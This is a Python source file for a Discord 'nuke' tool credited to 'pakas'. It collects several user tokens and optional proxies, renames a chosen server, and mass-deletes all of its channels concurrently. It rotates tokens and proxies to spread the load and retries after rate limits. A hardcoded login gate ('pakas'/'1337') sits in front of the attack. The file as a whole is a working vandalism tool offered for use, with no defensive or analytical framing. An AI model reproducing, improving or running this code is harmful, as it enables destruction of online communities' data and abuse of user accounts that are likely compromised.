import asyncio
import aiohttp
import sys
import hashlib
import sqlite3
import os
import glob
import time
import random
import shutil
import tempfile
from colorama import init, Fore, Style

init(autoreset=True)

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def get_icon_path():
    base = resource_path(".")
    ico_files = glob.glob(os.path.join(base, "*.ico"))
    if ico_files:
        return ico_files[0]
    return None

def get_db_path():
    """Returns a writable path for licenses.db. Uses tempdir if necessary."""
    # Try user's AppData first (writable)
    appdata = os.environ.get('APPDATA') or os.environ.get('HOME')
    if appdata:
        db_dir = os.path.join(appdata, 'ParkasNuke')
        try:
            os.makedirs(db_dir, exist_ok=True)
            test_file = os.path.join(db_dir, 'test_write.tmp')
            with open(test_file, 'w') as f:
                f.write('test')
            os.remove(test_file)
            return os.path.join(db_dir, 'licenses.db')
        except (OSError, PermissionError):
            pass
    
    # Fallback to temp directory
    temp_dir = tempfile.gettempdir()
    db_dir = os.path.join(temp_dir, 'ParkasNuke')
    try:
        os.makedirs(db_dir, exist_ok=True)
        return os.path.join(db_dir, 'licenses.db')
    except (OSError, PermissionError):
        pass
    
    # Final fallback: current working directory
    return os.path.join(os.getcwd(), 'licenses.db')

def init_db():
    """Initialize database with user 'pakas' and password '1337'."""
    db_path = get_db_path()
    db_dir = os.path.dirname(db_path)
    if db_dir:
        try:
            os.makedirs(db_dir, exist_ok=True)
        except OSError:
            pass
    
    # Delete existing database to force fresh creation
    if os.path.exists(db_path):
        try:
            os.remove(db_path)
        except:
            pass
    
    # Try to create/connect with retry
    for attempt in range(3):
        try:
            conn = sqlite3.connect(db_path, timeout=10)
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS users
                         (username TEXT PRIMARY KEY, password_hash TEXT)''')
            # Hash para "1337"
            test_pass_hash = hashlib.sha256("1337".encode()).hexdigest()
            c.execute("INSERT OR IGNORE INTO users (username, password_hash) VALUES (?, ?)",
                      ("pakas", test_pass_hash))
            conn.commit()
            conn.close()
            return True
        except sqlite3.OperationalError as e:
            if attempt < 2:
                time.sleep(0.5)
                continue
            # If all attempts fail, try a different path
            alt_path = os.path.join(tempfile.gettempdir(), 'licenses.db')
            if alt_path != db_path:
                try:
                    conn = sqlite3.connect(alt_path, timeout=10)
                    c = conn.cursor()
                    c.execute('''CREATE TABLE IF NOT EXISTS users
                                 (username TEXT PRIMARY KEY, password_hash TEXT)''')
                    test_pass_hash = hashlib.sha256("1337".encode()).hexdigest()
                    c.execute("INSERT OR IGNORE INTO users (username, password_hash) VALUES (?, ?)",
                              ("pakas", test_pass_hash))
                    conn.commit()
                    conn.close()
                    # Update global db path for authenticate
                    global _DB_OVERRIDE
                    _DB_OVERRIDE = alt_path
                    return True
                except:
                    pass
            return False
    return False

# Global override for db path if init fails
_DB_OVERRIDE = None

def get_db_path_override():
    global _DB_OVERRIDE
    if _DB_OVERRIDE and os.path.isfile(_DB_OVERRIDE):
        return _DB_OVERRIDE
    return get_db_path()

def authenticate():
    """Console-based authentication with up to 3 attempts."""
    max_attempts = 3
    attempts = 0
    
    print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)
    print(Fore.YELLOW + "          EUROPA - AUTHENTICATION" + Style.RESET_ALL)
    print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)
    
    while attempts < max_attempts:
        attempts += 1
        print(Fore.WHITE + f"\n[Attempt {attempts}/{max_attempts}]" + Style.RESET_ALL)
        
        username = input(Fore.GREEN + "Username: " + Style.RESET_ALL).strip()
        password = input(Fore.GREEN + "Password: " + Style.RESET_ALL).strip()
        
        pass_hash = hashlib.sha256(password.encode()).hexdigest()
        
        db_path = get_db_path_override()
        conn = None
        try:
            conn = sqlite3.connect(db_path, timeout=10)
            c = conn.cursor()
            c.execute("SELECT password_hash FROM users WHERE username=?", (username,))
            row = c.fetchone()
            if row is not None and row[0] == pass_hash:
                print(Fore.GREEN + "\n[✓] Authentication successful!" + Style.RESET_ALL)
                conn.close()
                return True
            else:
                print(Fore.RED + "[✗] Invalid username or password." + Style.RESET_ALL)
                if attempts >= max_attempts:
                    print(Fore.RED + "[!] Max attempts reached. Exiting." + Style.RESET_ALL)
                conn.close()
                continue
        except sqlite3.OperationalError as e:
            print(Fore.RED + f"[!] Database error: {str(e)}" + Style.RESET_ALL)
            if conn:
                conn.close()
            return False
        finally:
            if conn:
                conn.close()
    
    return False

ASCII_ART = r"""
   + ---------------------------------+
   |            M.                    |
   |       O---O  \    ___   __       |
   |  >__  > __.   |  /) )) //\\__\   |
   |   \ \  ^  |   | /) ))  \\//--/   |
   |----\ \____/    Y) ))____) )------|
   |. . .----\                /. . . .|
   |. . . . . /  )________)  /\ . . . |
   |. . . .  /  /. . . . /  /\ \ . . .|
   | . . .  >__/. . . . >__/ >__\ .  .|
   |. . . . . . . . . . . . . . . . . |
   +----------------------------------+
"""

def red_print(text: str) -> None:
    print(Fore.RED + text + Style.RESET_ALL)

def red_input(prompt: str) -> str:
    return input(Fore.RED + prompt + Style.RESET_ALL)

async def delete_channel_worker(session, channel_id, token, proxy, semaphore):
    async with semaphore:
        url = f"https://discord.com/api/v9/channels/{channel_id}"
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-Discord-Locale": "en-US"
        }
        for attempt in range(3):
            try:
                async with session.delete(url, headers=headers, proxy=proxy) as resp:
                    if resp.status == 429:
                        retry_after = float(resp.headers.get('Retry-After', 0.5))
                        await asyncio.sleep(retry_after)
                        continue
                    elif resp.status in (204, 200):
                        return (channel_id, 204)
                    elif resp.status in (403, 404):
                        return (channel_id, resp.status)
                    else:
                        await asyncio.sleep(0.1)
                        continue
            except (aiohttp.ClientError, asyncio.TimeoutError):
                await asyncio.sleep(0.2)
                continue
        return (channel_id, "failed_after_retries")

async def get_all_channels(session, guild_id, token):
    url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    async with session.get(url, headers=headers) as resp:
        if resp.status != 200:
            return []
        data = await resp.json()
        return [ch["id"] for ch in data if isinstance(ch, dict) and "id" in ch]

async def change_guild_name(session, guild_id, new_name, token):
    url = f"https://discord.com/api/v9/guilds/{guild_id}"
    payload = {"name": new_name}
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    async with session.patch(url, json=payload, headers=headers) as resp:
        return resp.status

async def nuke_all():
    token_input = red_input("Enter user tokens (comma separated): ").strip()
    tokens = [t.strip() for t in token_input.split(",") if t.strip()]
    if not tokens:
        red_print("At least one token required")
        sys.exit(1)

    proxy_input = red_input("Enter proxies (optional, comma separated): ").strip()
    proxies = [p.strip() for p in proxy_input.split(",") if p.strip()] if proxy_input else []

    try:
        guild_id = int(red_input("Enter server ID: ").strip())
    except ValueError:
        red_print("Invalid server ID (must be integer)")
        sys.exit(1)

    new_server_name = red_input("Enter new server name: ").strip()

    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    timeout = aiohttp.ClientTimeout(total=60, connect=10)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        if new_server_name:
            status = await change_guild_name(session, guild_id, new_server_name, tokens[0])
            red_print(f"[+] Server rename status: {status}")

        red_print("[*] Fetching channels...")
        channel_ids = await get_all_channels(session, guild_id, tokens[0])
        if not channel_ids:
            red_print("[!] No channels found or invalid token.")
            return
        total = len(channel_ids)
        red_print(f"[*] Found {total} channels")

        semaphore = asyncio.Semaphore(500)
        tasks = []
        for idx, cid in enumerate(channel_ids):
            token = tokens[idx % len(tokens)]
            proxy = proxies[idx % len(proxies)] if proxies else None
            tasks.append(delete_channel_worker(session, cid, token, proxy, semaphore))

        start_time = time.time()
        results = await asyncio.gather(*tasks)
        elapsed = time.time() - start_time

        success = sum(1 for _, s in results if s == 204)
        red_print(f"[+] Deleted {success}/{total} channels in {elapsed:.2f} seconds")
        red_print("[✓] Operation finished.")

if __name__ == "__main__":
    init_db()
    if not authenticate():
        sys.exit(1)

    print(Fore.RED + ASCII_ART + Style.RESET_ALL)
    print(Fore.YELLOW + "        Made by pakas" + Style.RESET_ALL)
    red_input("press Enter to execute.")
    asyncio.run(nuke_all())